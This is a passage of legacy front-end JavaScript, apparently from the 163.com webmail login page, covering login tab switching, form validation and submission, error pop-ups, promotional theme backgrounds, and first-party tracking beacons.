	}

	/**
	 * &#32465;&#23450;tab&#20107;&#20214;
	 */
	function fSwitchTab(){
		var me = this;
		var oTab = $id('loginBlock'),
			oTab1 = $id('lbNormal'),
			oTab2 = $id('lbMob'),
			oIdLabel = $id('idPlaceholder');
		var oInputTest = $id('idInputTest');
		me.hideError();

		if(ntabOn == 1){
			oIdLabel.innerHTML = '&#25163;&#26426;&#21495;&#30721;';
			sTmpId = oId.value;
			sTmpInput = oId.value;
			sTmpPwd = oPw.value;
			oTab.className = tab2Cls;
			ntabOn = 2;
			fEventUnlisten(oTab2, 'mouseover', me.switchTabTimeout);
			fEventUnlisten(oTab2, 'mouseout', me.setbSwitchTabTimeout);
			fEventListen(oTab1, 'mouseover', me.switchTabTimeout);
			fEventListen(oTab1, 'mouseout', me.setbSwitchTabTimeout);
			oId.value = sTmpMob;
			oPw.value = sTmpMobPwd;
			oInputTest.innerHTML = sTmpMobInput;
			if( sTmpMob == '' ){
				fCls(oIdL, 'showPlaceholder', 'add');
			}
			if( sTmpMobPwd == '' ){
				fCls(oPwL, 'showPlaceholder', 'add');
			}else{
				fCls(oPwL, 'showPlaceholder', 'remove');
			}
		}else{
			oIdLabel.innerHTML = '&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;';
			sTmpMob = oId.value;
			sTmpMobInput = oId.value;
			sTmpMobPwd = oPw.value;
			oTab.className = tab1Cls;
			ntabOn = 1;
			fEventUnlisten(oTab1, 'mouseover', me.switchTabTimeout);
			fEventUnlisten(oTab1, 'mouseout', me.setbSwitchTabTimeout);
			fEventListen(oTab2, 'mouseover', me.switchTabTimeout);
			fEventListen(oTab2, 'mouseout', me.setbSwitchTabTimeout);
			oId.value = sTmpId;
			oPw.value = sTmpPwd;
			oInputTest.innerHTML = sTmpInput;
			if( sTmpId == '' ){
				fCls(oIdL, 'showPlaceholder', 'add');
			}
			if( sTmpPwd == '' ){
				fCls(oPwL, 'showPlaceholder', 'add');
			}else{
				fCls(oPwL, 'showPlaceholder', 'remove');
			}
		}
		me.idInputEvent();
		me.focusInputBox();
	}

	function fSwitchTabTimeout(){
		setTimeout(function(){
			if(bSwitchTabTimeout){
				indexLogin.switchTab();
			}else{
				bSwitchTabTimeout = true;
			}
		}, 300);
	}

	function fSetbSwitchTabTimeout(){
		bSwitchTabTimeout = false;
	}

	/**
	 * &#35774;&#32622;&#29256;&#26412;
	 * @param  {Number} n &#29256;&#26412;&#21495;
	 */
	function fSetStyle(n){
		var oStyleConfBlk = $id('styleConfBlock');
		var aVers = oStyleConfBlk.getElementsByTagName('a');
		for(var i=0, l=aVers.length; i<l; i++){
			aVers[i].className = '';
		}
		oStyle.value = n;
		$id('styleconf' + n).className = 'verSelected';
		$id('styleConf').innerHTML = $id('styleconf' + n).innerHTML + ' <b class="ico ico-arr ico-arr-d"></b>';
		oStyleConfBlk.style.display = 'none';
		// &#21028;&#26029;&#26159;&#21542;&#20840;&#31243;ssl
		if(n == 3 || n == 6){
			// &#31616;&#32422;5\&#31616;&#32422;6 &#26174;&#31034;&#20840;&#31243;ssl
			$id('loginSSL').style.display = 'none';
			$id('AllSSL').style.display = 'block';
		}else{
			$id('loginSSL').style.display = 'block';
			$id('AllSSL').style.display = 'none';
			$id('AllSSLCkb').checked = false;
		}
	}

	/**
	 * &#30331;&#24405;&#25552;&#20132;
	 * @return {Boolean}
	 */
	function fSubmitForm(){
		var me = this;
		// &#26816;&#26597;&#36755;&#20837;
		oId.value = fTrim(oId.value);
		if(oId.value == ''){
			//alert('\&#35831;&#36755;&#20837;&#24744;&#30340;&#24080;&#21495;?');
			oId.focus();
			me.showError(ntabOn);
			return false;
		}
		if(oPw.value.length == ''){
			//alert('\&#35831;&#36755;&#20837;&#24744;&#30340;&#23494;&#30721;?');
			oPw.focus();
			me.showError(3);
			return false;
		}else if(!fTrim(oPw.value)){ // &#29305;&#27530;&#22788;&#29702;&#23494;&#30721;&#20840;&#31354;&#26684;
			me.showError(460);
			return false;
		}

		// starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
		if(bStartTime){
			var sNow = new Date().getTime();
			fSetCookie("starttime", sNow, false);
			bStartTime = false;
		}

		//&#29992;&#25143;&#21517;&#12289;&#23494;&#30721;&#19981;&#26631;&#20934;&#23383;&#31526;&#22788;&#29702;
		oId.value = me.handleString(oId.value);
		oPw.value = me.handleString(oPw.value);

		//16&#20301;&#23494;&#30721;&#25130;&#26029;
		if(oPw.value.length > 16){
			oPw.value = oPw.value.substr(0,16);
		}
		//&#20445;&#23384;&#21313;&#22825;&#20813;&#30331;&#24405;
		if($id('remAutoLogin').checked){
			$id('savelogin').value = 1;
		}else{
			$id('savelogin').value = 0;
		}
		//&#30331;&#38470;&#21518;&#38145;&#23450;tab
		var oTabDisabled;
		if( ntabOn == 1 ){
			oTabDisabled = $id('lbMob');
		}else{
			oTabDisabled = $id('lbNormal');
		}
		fEventUnlisten(oTabDisabled, 'mouseover', me.switchTabTimeout);
		fEventUnlisten(oTabDisabled, 'mouseout', me.setbSwitchTabTimeout);

		var fReBindSwitchTab = setInterval(function(){
			try{
				//&#33509;&#26377;&#38169;&#35823;&#25552;&#31034;&#65292;&#21017;&#37325;&#26032;&#32465;&#23450;&#20999;&#25442;tab&#20107;&#20214;
				if(window.frames["frameforlogin"].document.body.className == 'error'){
					fEventListen(oTabDisabled, 'mouseover', me.switchTabTimeout);
					fEventListen(oTabDisabled, 'mouseout', me.setbSwitchTabTimeout);
					clearInterval(fReBindSwitchTab);
				}
			}catch(e){}
		},500);

		//&#20648;&#23384;&#30331;&#24405;&#20449;&#24687;
		gUserInfo.username = oId.value;
		gUserInfo.style = oStyle.value;
		if(bIsFirstLog){
			//if($id('SslLogin').checked){
				gUserInfo.safe = 1;
				sLoginFunc = 'ssl';
			/*}else{
				gUserInfo.safe = 0;
				sLoginFunc = 'http';
			}*/
		}else{
			if(sLoginFunc == 'ssl'){
				gUserInfo.safe = 1;
			}else{
				gUserInfo.safe = 0;
			}
		}
		gVisitorCookie.saveInfo();
		//&#24377;&#20986;&#36229;&#26102;&#23545;&#35805;&#26694;
		if(bIsFirstLog){
			sCoremailCookie = fGetCookie('Coremail');
			setTimeout(function(){
				//&#33509;&#26080;&#38169;&#35823;&#25552;&#31034;&#65292;&#21017;&#21028;&#26029;&#20026;&#30331;&#24405;&#36229;&#26102;
				try{
					if(window.frames["frameforlogin"].document.body.className != 'error'){
						me.showTheHttpLogin();
					}
				}catch(e){
					me.showTheHttpLogin();
				}
			},5000);
		}
		//&#21028;&#26029;&#30331;&#24405;&#26469;&#28304;
		var sUrlRace = aSpdResult[1]+'_'+aSpdResult[0]+'_'+aSpdResult[2]+'_'+aSpdResult[3],
			sUrlDf = (function(){
				var sDf = fGetQueryHash('df');
				if(sDf == null){
					// &#21028;&#26029;&#19981;&#21516;tab
					var bIsMobile = ntabOn == 2;
					if(bIsMobile){
						sDf = 'mail163_mobile';
					}else{
						sDf = 'mail163_letter';
					}
				}
				fSetCookie('df',sDf,false);
				return sDf;
			})(),
			sUrlUid = oId.value + '@' + gOption.sDomain;
		// &#20840;&#31243;SSL
		var sAllSSL = ($id('AllSSLCkb').checked ? fUrlP('allssl', 'true') : '');
		//&#36873;&#25321;&#30331;&#24405;&#26041;&#24335;
		switch(sLoginFunc){
			case 'ssl' :
				var oForm = $id('login163');
				oForm.action = gOption.sSslAction
				+ fUrlP('df',sUrlDf,true)
				+ fUrlP('from','web')
				+ fUrlP('funcid','loginone')
				+ fUrlP('iframe','1')
				+ fUrlP('language','-1')
				+ fUrlP('passtype','1')
				+ fUrlP('product','mail163')
				+ fUrlP('net',sLocationInfo)
				+ fUrlP('style', oStyle.value)
				+ fUrlP('race',sUrlRace)
				+ fUrlP('uid', sUrlUid)
				+ sAllSSL;
				if(bIsFirstLog){
					bIsFirstLog = false;
					return true;
				}else{
					oForm.submit();
				}
				break;
			case 'http' :
				window.sHttpAction  = gOption.url
				+ fUrlP('df',sUrlDf,true)
				+ fUrlP('from','web')
				+ fUrlP('language','-1')
				+ fUrlP('net',sLocationInfo)
				+ fUrlP('race',sUrlRace)
				+ fUrlP('style', oStyle.value)
				+ fUrlP('uid', sUrlUid);
				loginRequest('fEnData');
				return false;
				break;
			default :;
		}
		return false;
	}

	/**
	 * &#30331;&#24405;&#36229;&#26102;&#24377;&#26694;
	 * @return {Boolean}
	 */
	function fShowTheHttpLogin(){
		var me = this;
		var oIdLoginBtn = $id('idLoginBtn'),
			oHttpTips = $id('enhttpTips');
		fResize();
		window.frames['frameforlogin'].location.href = 'about:blank';
		$id('enhttpblock').style.display = 'block';
		$id('mask').style.display = 'block';
		$id('enhttpblock').focus();
		if(sLoginFunc == 'ssl'){
			var sCoremailCookieNew = fGetCookie('Coremail');
			if( sCoremailCookieNew != sCoremailCookie ){
				oHttpTips.innerHTML = '&#30331;&#24405;&#25104;&#21151;..&#31561;&#24453;&#36339;&#36716;..';
				oIdLoginBtn.style.display = 'none';
				return false;
			}else{
				var nCount = 3;
				oHttpTips.innerHTML = '<span id="backwards">' + nCount +'</span>&nbsp;&#31186;&#21518;&#33258;&#21160;&#37325;&#35797;';
				oIdLoginBtn.innerHTML = '&#31435;&#21051;&#30331;&#24405;';
				fEventUnlisten(oIdLoginBtn, 'click', _fLoginFunc);
				fEventListen(oIdLoginBtn, 'click', _fLoginFunc1);
				window.gBackwards = setInterval(function(){
					nCount = nCount - 1;
					$id('backwards').innerHTML = nCount;
					if(nCount == 0){
						clearInterval(window.gBackwards);
						sLoginFunc = 'http';
						me.submitForm();
						me.showTheHttpLogin();
					}
				},1000);
				return false;
			}
		}else{
			oHttpTips.innerHTML = '&#28857;&#20987;&#37325;&#26032;&#23581;&#35797;&#26222;&#36890;&#21152;&#23494;&#26041;&#24335;&#30331;&#24405;';
			oIdLoginBtn.innerHTML = '&#37325;&#35797;';
			fEventUnlisten(oIdLoginBtn, 'click', _fLoginFunc1);
			fEventListen(oIdLoginBtn, 'click', _fLoginFunc);
		}

		// &#30331;&#24405;&#20989;&#25968;&#24341;&#29992;
		function _fLoginFunc(){
			me.submitForm();
		}
		function _fLoginFunc1(){
			me.submitForm();
			oHttpTips.innerHTML ='&#28857;&#20987;&#37325;&#26032;&#23581;&#35797;https&#30331;&#24405;';
			oIdLoginBtn.innerHTML = '&#37325;&#35797;';
			clearInterval(window.gBackwards);
			fEventUnlisten(oIdLoginBtn, 'click', _fLoginFunc1);
			fEventListen(oIdLoginBtn, 'click', _fLoginFunc);
		}
	}

	/**
	 * &#38169;&#35823;&#20449;&#24687;&#25552;&#31034;
	 * @param  {Number} nCode &#38169;&#35823;&#20195;&#30721;
	 */
	function fShowError(nCode){
		var me = this;
		var sErrType = '',
			nTarget = 0,
			nBasePoint = 217;
		var oErrAlert = $id('errorAlert'),
			oErrArr = $id('errorArr'),
			oErrDetail =$id('errorDetail');
		if(!isNaN(nCode)){
	    	nCode = nCode - 0;
	    }
		switch(nCode){
			case 'Login_Timeout':
				sErrType = 'loginTimeout';
				nTarget = 0;
				break;
			case 1:
				sErrType = 'noId';
				nTarget = 1;
				break;
			case 2:
				sErrType = 'noPhone';
				nTarget = 1;
				break;
			case 3:
				sErrType = 'noPw';
				nTarget = 2;
				break;
			case 460:
				sErrType = 'inputWrong';
				nTarget = 0;
				break;
			case 420:
				sErrType = 'inputWrong';
				nTarget = 0;
				break;
			case 422:
				sErrType = 'idLocked';
				nTarget = 1;
				break;
			/*case 412:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;*/ //&#24050;&#21333;&#29420;&#22788;&#29702;
			case 414:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			case 415:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			case 416:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			case 417:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			case 418:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			case 419:
				sErrType = 'loginWrong';
				nTarget = 0;
				break;
			default:
				sErrType = 'systemBusy';
				nTarget = 0;
		}
		if(nCode){
			$id('errorTitle').innerHTML = gErrorInfo[sErrType].title;
			if(gErrorInfo[sErrType].info){
				$id('errorInfo').innerHTML = gErrorInfo[sErrType].info;
				oErrDetail.style.display = 'block';
			}else{
				oErrDetail.style.display = 'none';
			}
			if(nTarget == 1){
				nBasePoint -= 30;
			}else if(nTarget == 2){
				nBasePoint += 30;
			}
			$id('errorMask').style.display = 'block';
			fCls(oErrAlert, 'errorAlert-show', 'add');
			oErrAlert.style.top = nBasePoint - oErrAlert.offsetHeight/2 + 'px';
			oErrArr.style.top = (oErrAlert.offsetHeight - oErrArr.offsetHeight)/2 + 'px';

			fEventListen(document, 'click', me.hideError);
		}
	}

	/**
	 * &#38544;&#34255;&#38169;&#35823;&#20449;&#24687;&#25552;&#31034;
	 */
	function fHideError(){
		fCls($id('errorAlert'), 'errorAlert-show', 'remove');
		$id('errorMask').style.display = 'none';
		fEventUnlisten(document, 'click', indexLogin.hideError);
	}

	/**
	 * &#35774;&#32622;&#22402;&#30452;&#23621;&#20013;
	 */
	function fVericalAlignBody(){
		var nBodyHeight = 730;
		var nClientHeight = document.documentElement.clientHeight;
		if(nClientHeight >= nBodyHeight + 2){
			var nDis = (nClientHeight - nBodyHeight)/2;
			document.body.style.paddingTop = nDis + 'px';
		}else{
			document.body.style.paddingTop = '0px';
		}
	}

	/**
	 * &#37325;&#20889;&#21487;&#20449;&#26631;&#35782;
	 */
	function fKX(){
		function RndNum_CNNIC(k){
			for (var rnd = "", i = k; i--; ){
				rnd += Math.floor( Math.random() * 10 );
			}
			return rnd;
		}
		var oKX = $id('KX_IMG');
		var oKXimg = oKX.getElementsByTagName('img')[0];
		var sHref = 'https://ss.knet.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa=';
		var sPa = RndNum_CNNIC(6);
		oKX.href = sHref + sPa;
	}

	/**
	 * &#20020;&#26102;&#32479;&#35745;
	 */
	function fTmpSwitchLog(){
		var sJsLogUrl = 'http://count.mail.163.com/beacon/webmail.gif?product=mail163tab2&type=from163com';
		sJsLogUrl = sJsLogUrl + '&rnd=' + (new Date()).getTime();
		var oJsLogImg = $id('jslogimg');
		if(!oJsLogImg){
			oJsLogImg = document.createElement("IMG");
			oJsLogImg.style.display = 'none';
			oJsLogImg.alt = '';
		}
		oJsLogImg.setAttribute("src", sJsLogUrl);
		if(oJsLogImg.alt == ''){
			document.body.appendChild(oJsLogImg);
			oJsLogImg.alt = 'set';
		}
		return;
	}

	/*------------- &#20027;&#39064;&#22270;&#30456;&#20851; ------------*/

	/**
	 * &#33719;&#21462;&#20010;&#24615;&#21270;&#29992;&#25143;&#25968;&#25454;
	 * @return {Object} &#20010;&#24615;&#21270;&#25968;&#25454;&#26631;&#24535;&#20301;&#32452;&#21512;&#23545;&#35937;
	 */
	function fAdGetUdData(){
		try {
			var oData = gAdUserPropertyData;
			if(oData){
				return oData;
			}else{
				oData = {};
			}
			// &#35835;&#21462;cookie
			oData['all'] = fGetCookie('_mail_userattr_');
			if(oData['all'] && oData['all'].length > 0){
				oData['mobile'] = oData['all'].split("/")[0] - 0;
				oData['yixin'] = oData['all'].split("/")[1] - 0;
				oData['news'] = oData['all'].split("/")[2] - 0;
				oData['music'] = oData['all'].split("/")[3] - 0;
				oData['read'] = oData['all'].split("/")[4] - 0;
			}
			gAdUserPropertyData = oData;

			return oData;
		} catch (e) {return false;}
	}

	function fInitThemes(){
		var me = this;

		gAdManager.init();

		me.oTheme = gAdManager.getAll({
			position : "index",
			domain : "163"
		});

		me.showThemes(me.oTheme);
	}

	/**
	 * &#20027;&#39064;&#22270;&#26174;&#31034;
	 * @param  {Object} oTheme &#32032;&#26448;&#23545;&#35937;
	 */
	function fShowThemes(oTheme){
		var me = this;
		var oThemeWrap = $id('theme'),
			oBg = $id('mainBg'),
			oCnt = $id('mainCnt');
		// &#37325;&#32622;oMaterial
		oThemeWrap.innerHTML = '';
		oThemeWrap.style.cssText = '';
		oBg.style.cssText = '';
		oCnt.style.cssText = '';

		var oMaterial = oTheme.material;
		
		// &#20026;&#25512;&#24191;&#24179;&#21488;&#25552;&#20379;uid
		var sUid = (gUserInfo.username ? gUserInfo.username : 'nt') + '@' + gOption.sDomain;
		oMaterial.showLink && (oMaterial.showLink += '&uid=' + sUid);

		if (oMaterial.product && oMaterial.product == 'bizAD') {
			// &#21830;&#24191;&#29305;&#27530;&#22788;&#29702;&#65292;&#19981;&#32479;&#35745;&#28857;&#20987;&#38142;&#25509;&#65292;&#21542;&#21017;&#26080;&#27861;&#27491;&#24120;&#36339;&#36716;
		}else{
			oMaterial.bgLink && (oMaterial.bgLink += '&_r_ignore_uid=' + sUid);
		}

		// &#23637;&#31034;&#25968;&#25454;&#32479;&#35745;
		if(oMaterial.showLink && oMaterial.showLink != 0){
			me.themeShowLog(oMaterial.showLink);
		}

		// &#26131;&#20449;&#30701;&#20449;&#25512;&#36865;
		if(oMaterial.product && oMaterial.product == 'yixin'){
			fEventListen(oThemeWrap, 'click', me.adSendMsg);
		}else{
			fEventUnlisten(oThemeWrap, 'click', me.adSendMsg);
		}

		// &#21547;&#23376;&#32032;&#26448;
		if(oTheme.childrenMaterials){
			var aChildren = oTheme.childrenMaterials;
			oMaterial = oTheme.childMaterail;

			// &#26131;&#20449;&#24863;&#24681;&#33410;
			if(oMaterial.product == 'yixin-ThanksGiving'){
				var sBtnCount = aChildren.length;
				var oThanksBtns = document.createElement('div');
				oThanksBtns.id = 'thanksBtns';
				oThanksBtns.style.cssText = 'position:absolute;left:85px;bottom:12px;zoom:1';

				oThemeWrap.appendChild(oThanksBtns);
				for(var i=0; i<sBtnCount; i++){
					var oLink = document.createElement('a');
					oLink.style.cssText = 'display:block;margin-right:45px;float:left;width:78px;height:76px;outline:none';
					oLink.className = 'thanksBtns-' + i;
					oLink.href = 'javascript:void(0)';
					oLink.setAttribute('hideFocus', true);
					oLink.setAttribute('thanksIndex', i);
					oLink.onclick = function(){
						var that = this;
						_fImgLoader(aChildren[that.getAttribute('thanksIndex')-0].bgCnt, function(){
							oBg.style.backgroundColor = aChildren[that.getAttribute('thanksIndex')-0].bgColor;
							oCnt.style.backgroundImage = 'url(' + aChildren[that.getAttribute('thanksIndex')-0].bgCnt + ')';
						});
					}
					$id('thanksBtns').appendChild(oLink);
				}
			}
		}

		// &#22270;&#29255;&#26174;&#31034;&#22788;&#29702;
		if(oMaterial.bgColor){
			oBg.style.backgroundColor = oMaterial.bgColor;
		}else{
			oBg.style.backgroundColor = '#fff';
		}
		if(oMaterial.bgCnt){
			_fImgLoader(oMaterial.bgCnt, function(){
				oCnt.style.backgroundImage = 'url(' + oMaterial.bgCnt + ')';
				oCnt.style.backgroundRepeat = 'no-repeat';
				oCnt.style.backgroundPosition = 'center top';
			});
		}
		if(oMaterial.bgSrc){
			_fImgLoader(oMaterial.bgSrc, function(){
				oBg.style.backgroundImage = 'url(' + oMaterial.bgSrc + ')';
				if(oMaterial.bgSrcRepeat){
					oBg.style.backgroundRepeat = oMaterial.bgSrcRepeat;
				}else{
					oBg.style.backgroundRepeat = 'repeat-x';
				}
				if(oMaterial.bgSrcPosition){
					oBg.style.backgroundPosition = oMaterial.bgSrcPosition;
				}else{
					oBg.style.backgroundPosition = 'left top';
				}
			});
		}

		// &#24038;&#21491;&#32972;&#26223;&#22270;&#22788;&#29702;
		fEventUnlisten(window, 'resize', _fLeftRightBg);
		if(oMaterial.bgLeft || oMaterial.bgRight){
			_fLeftRightBg(1);
			if($id('dvbg2012left') && $id('dvbg2012left').style.display == 'block'){
				fEventListen(window, 'resize', _fLeftRightBg);
			}
		}else{
			$id('dvbg2012left') && ($id('dvbg2012left').style.display = 'none');
			$id('dvbg2012right') && ($id('dvbg2012right').style.display = 'none');
		}

		// &#39318;&#39029;&#35780;&#20998;
		if(oMaterial.scoreIndex){
			$id('scoreIndex').style.display = "block";
			window.oScoreIndex = oMaterial;
		}else{
			$id('scoreIndex').style.display = "none";
		}

		//&#20113;&#38899;&#20048;&#25773;&#25918;
		if(oMaterial.musicLink){
			$id('musicLink').style.display = "block";
			$id('musicLink').href = oMaterial.musicLink;
		}else{
			$id('musicLink').style.display = "none";
		}

		// &#20113;&#38899;&#20048;
		if(oMaterial.product && oMaterial.product == 'yunMusic'){
			var oLink = document.createElement('div');
			oLink.style.cssText = 'position:absolute;width:1000px;height:600px;left:0;top:0;cursor:pointer';
			oLink.title = '&#32593;&#26131;&#20113;&#38899;&#20048;';
			oThemeWrap.appendChild(oLink);
			oLink.setAttribute('hideFocus', true);
			oLink.onclick = function(){
				_fMusicUidCheck();
				return false;
			}
		}

		// &#24102;&#38142;&#25509;&#20027;&#39064;&#22270;
		if(oMaterial.bgLink){
			var oLink = document.createElement('a');
			oLink.style.cssText = 'position:absolute;width:605px;height:600px;left:0;top:0;cursor:pointer';
			oLink.href = oMaterial.bgLink;
			oLink.target = "_blank";
			oThemeWrap.appendChild(oLink);
			oLink.setAttribute('hideFocus', true);
		}

		// &#24102;&#35270;&#39057;&#25773;&#25918;&#20027;&#39064;&#22270;
		if(oMaterial.video){
			var aVideoPlayer = document.createElement('div');
			aVideoPlayer.style.cssText = 'position:absolute;overflow:hidden;width:'+oMaterial.videoWd+'px;height:'+oMaterial.videoHt+'px;top:'+oMaterial.videoTop+'px;left:'+oMaterial.videoLeft+'px';
			aVideoPlayer.innerHTML = '<embed width="' + oMaterial.videoWd + '" height="' + oMaterial.videoHt + '" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent" src="' + oMaterial.video + '" allowScriptAccess="always" />';
			oThemeWrap.appendChild(aVideoPlayer);
		}

		// &#24102;&#39069;&#22806;&#38142;&#25509;&#20027;&#39064;&#22270;
		if(oMaterial.extLink){
			var oExtLink = document.createElement('a');
			oExtLink.style.cssText = 'position:absolute;cursor:pointer;width:'+oMaterial.extLinkWd+'px;height:'+oMaterial.extLinkHt+'px;top:'+oMaterial.extLinkTop+'px;left:'+oMaterial.extLinkLeft+'px';
			oExtLink.href = oMaterial.extLink;
			oExtLink.target = "_blank";
			oExtLink.title = oMaterial.extLinkTitle ? oMaterial.extLinkTitle : '';
			oThemeWrap.appendChild(oExtLink);
			oExtLink.setAttribute('hideFocus', true);
		}

		function _fMusicUidCheck(){
			var sInterface = 'http://mobilemail.mail.163.com/mobilemail/webmail/entrace.do?from=index&';
			var sUser = gUserInfo.username;
			var sPInfo = fGetCookie('P_INFO');
			if(sPInfo){
				var aInfo = sPInfo.split("|");
				var sEmail = aInfo[0];
			}
			sUser = sEmail;
			if(sUser == null){
				sUser = $id('idInput').value;
			}
			if(sUser == ''){
				bHasUid = true;
			}
			if(sUser.indexOf('@163.com') == -1){
				sUser = sUser + '@163.com';
			}
			var sCookieUse = sUser;
			var bHasUid = false;
			var sUsedUid = fGetCookie('music_uid');
			var aUsedUid = [];
			if(sUsedUid){
				if(sUsedUid.indexOf(',') > -1){
					aUsedUid = sUsedUid.split(',');
				}else{
					aUsedUid.push(sUsedUid);
				}
			}
			var nLen = aUsedUid.length;
			for(var i = 0; i < nLen; i++){
				if(sCookieUse == aUsedUid[i]){
					bHasUid = true;
					break;
				}
			}
			window.nMusicType = oMaterial.musicType;

			if(sUser == '@163.com'){
				bHasUid = true;
			}
			if(bHasUid){
				// &#19981;&#21457;&#36865;
				me.musicCallback({'code' : 999});
				return false;
			}else{
				aUsedUid.push(sCookieUse);
				fSetCookie("music_uid", aUsedUid.join(','), (new Date(2014, 7, 1)).toGMTString());
				fGetScript(sInterface + 'uid=' + sUser + '&type=' + window.nMusicType + '&callback=indexLogin.musicCallback');
			}
		}

		var bRetrySetLeftRight = true;
		function _fLeftRightBg(flag){
			// &#21019;&#24314;&#24038;&#21491;&#32972;&#26223;&#32467;&#26500;
			var nWidth = (oBg.offsetWidth - 1000) / 2;
			if(oBg.offsetWidth == 0 && bRetrySetLeftRight){
				setTimeout(function(){
					bRetrySetLeftRight = false;
					_fLeftRightBg();
				}, 400);
				return;
			}
			if(oBg.offsetWidth <= 1000){
				return;
			}
			var oDvBg1 = $id('dvbg2012left');
			var oDvBg2 = $id('dvbg2012right');
			if(oMaterial.bgLeft){
				if(!oDvBg1){
					var oDvBg1 = document.createElement('div');
					oDvBg1.setAttribute('id', 'dvbg2012left');
					__fSetBgStyle(oDvBg1, oMaterial.bgLeft);
					oDvBg1.style.right = '1000px';
					oDvBg1.style.backgroundPosition = 'top right';
					oCnt.appendChild(oDvBg1);
				}else{
					__fSetBgStyle(oDvBg1, oMaterial.bgLeft);
					oDvBg1.style.width = nWidth + 'px';
				}
			}
			if(oMaterial.bgRight){
				if(!oDvBg2){
					var oDvBg2 = document.createElement('div');
					oDvBg2.setAttribute('id', 'dvbg2012right');
					__fSetBgStyle(oDvBg2, oMaterial.bgRight);
					oDvBg2.style.left = '1000px';
					oDvBg2.style.backgroundPosition = 'top left';
					oCnt.appendChild(oDvBg2);
				}else{
					__fSetBgStyle(oDvBg2, oMaterial.bgRight);
					oDvBg2.style.width = nWidth + 'px';
				}
			}

			//IE&#12289;chrome&#25191;&#34892;&#20004;&#27425;resize&#32465;&#23450;&#20107;&#20214;&#20020;&#26102;&#35299;&#20915;&#26041;&#26696;
			if(flag == 1){
				oDvBg1.style.display = 'block';
				oDvBg2.style.display = 'block';
			}else{
				if(oDvBg1.style.display == 'none'){
					oDvBg1.style.display = 'none';
					oDvBg2.style.display = 'none';
				}else{
					oDvBg1.style.display = 'block';
					oDvBg2.style.display = 'block';
				}
			}

			function __fSetBgStyle(o, sImgSrc){
				o.style.height = '600px';
				o.style.width = nWidth + 'px';
				o.style.top = '0';
				if(sImgSrc.indexOf('http://') == -1){
					o.style.backgroundColor = sImgSrc;
					o.style.backgroundImage = '';
				}else{
					o.style.backgroundColor = '';
					o.style.backgroundImage = 'url(' + sImgSrc + ')';
					o.style.backgroundRepeat = 'no-repeat';
				}
				o.style.position = 'absolute';
			}
		}

		function _fImgLoader(imgSrc, fSuccCallBack, fErrorCallBack, nTimeout){
			window.bImgLoaderIsLoaded = false;
			var oImg = document.createElement('IMG');
			if(fSuccCallBack){
				oImg.onload = function(){
					fSuccCallBack();
					window.bImgLoaderIsLoaded = true;
				};
			}
			if(fErrorCallBack){
				oImg.onerror = function(){
					fErrorCallBack();
				};
			}
			var nTime = 0;
			if(nTimeout){
				nTime = nTimeout;
			}
			setTimeout(function(){
				oImg.src = imgSrc;
			}, nTime);
		}
	}

	/**
	 * &#20027;&#39064;&#22270;&#24191;&#21578;&#23637;&#29616;&#32479;&#35745;
	 * @param  {String} sLink &#23637;&#31034;&#32479;&#35745;&#38142;&#25509;url
	 */
	function fThemeShowLog(sLink){
		var oImg = document.getElementById("AD__IMG");
		if(!oImg){
			oImg = document.createElement("IMG");
			oImg.id = 'AD__IMG';
			oImg.width = "1px";
			oImg.height = "1px";
			oImg.style.position = 'absolute';
			oImg.style.left = '-100px';
			oImg.style.top = '-100px';
			document.body.appendChild(oImg);
		}
		oImg.src = sLink + '&rnd=' + Math.random();
	}

	/**
	 * &#39318;&#39029;&#35780;&#20998;
	 * @return {Object} &#39318;&#39029;&#35780;&#20998;&#26041;&#27861;&#23545;&#35937;
	 */
	function fScoreIndex(){
		var o = {
			 open : fScoreIndexOpen
			,close : fScoreIndexClose
		};

		function fScoreIndexOpen(){
			if(oScoreIndex){
				fResize();
				$id('mask').style.display = 'block';
				$id('scoreIndexPop').style.display = 'block';
				$id('scoreIndexPopIfm').src = '/scoreindex.htm';
			}else{
				return;
			}
		}

		function fScoreIndexClose(){
			$id('mask').style.display = 'none';
			$id('scoreIndexPop').style.display = 'none';
		}

		return o;
	}

	/**
	 * &#26131;&#20449;&#30701;&#20449;&#25512;&#36865;
	 */
	function fAdSendMsg(){
	    var oData = indexLogin.adGetUdData();
	    // &#27809;&#26377;cookie&#65292;&#25110;&#32773;&#27809;&#26377;&#24320;&#36890;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#30340;&#65292;&#30452;&#25509;&#36820;&#22238;
	    if(!oData.all || oData.mobile != 1){
	        return;
	    }
	    // &#33719;&#21462;&#20027;&#24080;&#21495;&#65281;
	    var sOrgUid = fGetCookie('_mail_orguid_');
	    if(!sOrgUid){
	        return;
	    }
	    var oImg = document.getElementById("AD_MSG_IMG");
	    if(!oImg){
	        oImg = document.createElement("IMG");
	        oImg.id = 'AD_MSG_IMG';
	        oImg.width = "1px";
	        oImg.height = "1px";
	        oImg.style.position = 'absolute';
	        oImg.style.left = '-100px';
	        oImg.style.top = '-100px';
	        document.body.appendChild(oImg);
	    }
	    oImg.src = 'http://security.mail.163.com/mobileserv/promoteSms.do?uid='+ sOrgUid +'&product=mlyxpromote&area=index&rnd=' + Math.random();
	}

	/**
	 * &#20113;&#38899;&#20048;&#22238;&#35843;&#20989;&#25968;
	 * @param  {Object} o JSONP&#25104;&#21151;&#22238;&#35843;&#23545;&#35937;
	 */
	function fMusicCallback(o){
		var oYunMusic = $id('yunMusic'),
			oMask = $id('mask');
		$id('yunMusicClose').onclick = function(){
			oYunMusic.style.display = 'none';
			oMask.style.display = 'none';
		}
		$id('yunMusicConfirm').onclick = function(){
			oYunMusic.style.display = 'none';
			oMask.style.display = 'none';
		}
		var sLink = 'http://music.163.com/?act=cmad_20130517_08';
	    //&#30427;&#22799;&#30340;&#26524;&#23454;
	    if(window.nMusicType == 12){
	        sLink = 'http://music.163.com/#/m/playlist?id=2838260';
	        $id('yunMusicConfirm').href = sLink;
	    }

		if(o.code == 999){
